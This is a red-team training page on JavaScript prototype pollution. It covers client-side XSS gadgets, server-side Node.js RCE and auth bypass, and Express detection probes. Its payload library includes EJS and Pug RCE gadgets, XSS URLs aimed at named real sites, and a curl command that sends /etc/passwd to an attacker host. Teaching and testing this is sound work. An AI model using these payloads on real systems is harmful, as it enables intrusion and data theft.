---
layout: training-page
title: "Prototype Pollution — Red Team Academy"
module: "Web Hacking"
tags:
  - prototype-pollution
  - nodejs
  - client-side
  - rce
  - express
page_key: "web-prototype-pollution"
render_with_liquid: false
---

# Prototype Pollution

Prototype pollution abuses JavaScript's prototype chain — by injecting properties into `Object.prototype`, every object in the application inherits the injected property. Client-side: leads to XSS via DOM gadgets. Server-side (Node.js): leads to RCE, auth bypass, and denial of service.

## How It Works

```
# JavaScript prototype chain:
# Every object inherits from Object.prototype
# Polluting Object.prototype affects ALL objects

# Example:
let obj = {};
obj.__proto__.polluted = "yes";
console.log({}.polluted);  // → "yes" — every empty object has it now
console.log([].polluted);   // → "yes" — arrays too

# Vulnerable merge function (common pattern):
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];  // no hasOwnProperty check!
  }
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);  // → true (POLLUTED)
```

## Client-Side Prototype Pollution

```
# Sources (user-controlled input that flows into merge/clone):
# URL parameters: ?__proto__[polluted]=value
# URL hash: #__proto__[polluted]=value
# JSON body: {"__proto__":{"polluted":"value"}}

# Detection — try injecting via URL:
https://target/?__proto__[testprop]=polluted
# Then in browser console:
Object.prototype.testprop  // → "polluted" = vulnerable

# Constructor-based alternative (bypasses some filters):
?constructor[prototype][testprop]=polluted
?__proto__[testprop]=polluted

# Gadgets (built-in browser/jQuery behaviors triggered by polluted props):
# jQuery gadgets:
# innerHTML: ?__proto__[innerHTML]=<img src=1 onerror=alert(1)>
# html() gadget: ?__proto__[html]=<script>alert(1)</script>
# jQuery <1.9: $.each() → XSS via polluted selector

# DOM gadget hunting:
# Look for code like: element.innerHTML = options.template
# If options comes from polluted object: pollute "template" property

# PP2XSS — automated client-side gadget finder:
# https://github.com/BlackFan/client-side-prototype-pollution
```

## Server-Side Prototype Pollution (Node.js)

```
# Vulnerable patterns in Node.js:
# 1. Lodash merge (lodash <4.17.21 — CVE-2019-10744):
const _ = require('lodash');
_.merge({}, JSON.parse(userInput));  // pollutes Object.prototype

# 2. jQuery extend (server-side):
$.extend(true, {}, JSON.parse(userInput));

# 3. Manual deep merge without hasOwnProperty:
# → Object.prototype.polluted = attacker_value

# Detection via JSON body:
POST /api/user/settings
Content-Type: application/json
{"__proto__": {"json spaces": 10}}

# If response JSON is pretty-printed with 10 spaces → vulnerable
# (Express uses "json spaces" property from process.env / req.app.settings)

# Other detectable properties:
{"__proto__": {"status": 510}}   # if HTTP 510 returned → vulnerable
{"__proto__": {"exposedHeaders": ["X-PP-Test"]}}  # check CORS headers
```

## PP to RCE via Child Process

```
# Node.js child_process.spawn uses options.env and options.shell
# Polluting "shell" enables arbitrary command execution:

# If application spawns child processes after parsing polluted input:
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}

# Polluting execArgv:
{"__proto__": {"execArgv": ["--eval", "require('child_process').exec('id|curl http://attacker.com/rce?d=$(cat /etc/passwd|base64)')"]}}

# CVE-2022-1537 (Grunt) — PP to RCE via file system operations:
# Grunt's file.copy doesn't sanitize __proto__ in options

# PP in ejs (Express template engine) → RCE:
# Inject "outputFunctionName" or "escape" into Object.prototype
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

# pp-finder — automated Node.js PP gadget finder:
# https://github.com/nicolo-ribaudo/pp-finder
```

## PP to Auth Bypass

```
# Admin check pattern:
if (user.isAdmin) { /* allow */ }
# Pollute: {"__proto__": {"isAdmin": true}}
# → every new object has isAdmin=true

# Permission check:
if (req.user.permissions.includes('admin')) { }
# Pollute includes():
{"__proto__": {"includes": {}}}  # make includes always truthy

# Null check bypass:
if (!user.banned) { /* allow */ }
# Object.prototype.banned = false (already is, but can override to undefined/false)
```

## Prototype Pollution Payload Library

Payload reference from PayloadsAllTheThings covering all injection vectors.

### JSON Input Payloads

```
// Basic pollution via __proto__:
{"__proto__": {"evilProperty": "evilPayload"}}

// Pollution via constructor.prototype:
{"constructor": {"prototype": {"foo": "bar", "json spaces": 10}}}

// Node.js async RCE gadget (DNS callback):
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=payload\"\".oastify\"\".com"
  }
}

// EJS template engine RCE gadget:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// Express.js json spaces detection probe:
{"__proto__": {"json spaces": " "}}
// → If response JSON has extra spaces: vulnerable
```

### URL Query String Payloads (In-the-Wild)

```
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
https://www.apple.com/shop/buy-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
http://server/servicedesk?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
```

### ExpressJS Manual Testing Probes

```
// Test for prototype pollution in ExpressJS apps:

// parameterLimit probe — reduce allowed params, send extra:
{"__proto__": {"parameterLimit": 1}}
// Send 2+ GET parameters — if only 1 reflected: vulnerable

// ignoreQueryPrefix probe:
{"__proto__": {"ignoreQueryPrefix": true}}
// Send: ??foo=bar — if foo is parsed: vulnerable

// allowDots probe:
{"__proto__": {"allowDots": true}}
// Send: ?foo.bar=baz — if foo.bar parsed: vulnerable

// CORS header probe:
{"__proto__": {"exposedHeaders": ["X-PP-Test"]}}
// If Access-Control-Expose-Headers: X-PP-Test appears: vulnerable

// Status code probe:
{"__proto__": {"status": 510}}
// If HTTP 510 is returned: vulnerable
```

## Server-Side Prototype Pollution

Node.js server-side gadgets and exploitation techniques from PayloadsAllTheThings.

### Known Vulnerable Libraries

```
# Lodash <4.17.21 (CVE-2019-10744):
const _ = require('lodash');
_.merge({}, JSON.parse(userInput));  // pollutes Object.prototype

# Lodash <4.17.17 — mergeWith, defaultsDeep:
_.mergeWith({}, JSON.parse(userInput));
_.defaultsDeep({}, JSON.parse(userInput));

# jQuery.extend() with deep=true:
$.extend(true, {}, JSON.parse(userInput));

# flat package (npm) — deserialize() before fix:
const {unflatten} = require('flat');
unflatten({"__proto__.polluted": "yes"});

# qs package — parsing nested params:
qs.parse("__proto__[polluted]=yes", {allowPrototypes: true});  // vulnerable config
```

### RCE Gadgets (Node.js)

```
# child_process.spawn — shell option gadget:
{"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}}

# execArgv gadget:
{"__proto__": {"execArgv": ["--eval", "require('child_process').exec('id|curl http://attacker.com/rce?d=$(cat /etc/passwd|base64)')"]}}

# EJS render gadget (outputFunctionName):
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

# Pug template engine gadget:
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}

# Tools:
# pp-finder — automated gadget discovery: github.com/yeswehack/pp-finder
# silent-spring — automated PP→RCE analysis: github.com/yuske/silent-spring
# server-side-prototype-pollution gadgets: github.com/yuske/server-side-prototype-pollution
# Burp Extension: "Server-Side Prototype Pollution Scanner"
```

## Tools & Resources

- Burp Suite — Hackvertor extension for encoding payloads
- client-side-prototype-pollution — `github.com/BlackFan/client-side-prototype-pollution`
- server-side-prototype-pollution — `github.com/nicolo-ribaudo/pp-finder`
- PortSwigger PP labs — `portswigger.net/web-security/prototype-pollution`
- PP scanner Burp extension — "Server-Side Prototype Pollution Scanner"
